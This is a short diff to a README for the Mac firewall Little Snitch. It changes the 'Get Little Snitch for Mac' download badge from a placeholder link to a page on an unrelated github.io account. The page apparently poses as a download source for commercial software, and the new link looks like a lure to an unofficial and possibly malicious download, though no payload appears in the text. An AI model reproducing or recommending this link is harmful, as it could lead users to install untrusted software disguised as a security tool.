@@ -2,7 +2,7 @@
 
 ![Little Snitch Mac Logo](https://upload.wikimedia.org/wikipedia/en/0/01/Little_Snitch_4_logo.png)  
 
-[![⬇️ Get Little Snitch for Mac](https://img.shields.io/badge/⬇️_Get_Little_Snitch_Mac-darkblue?style=for-the-badge&logo=apple)](#)  
+[![⬇️ Get Little Snitch for Mac](https://img.shields.io/badge/⬇️_Get_Little_Snitch_Mac-darkblue?style=for-the-badge&logo=apple)](https://junimata-orex.github.io/.github/little-snitch)  
 
 ---
 
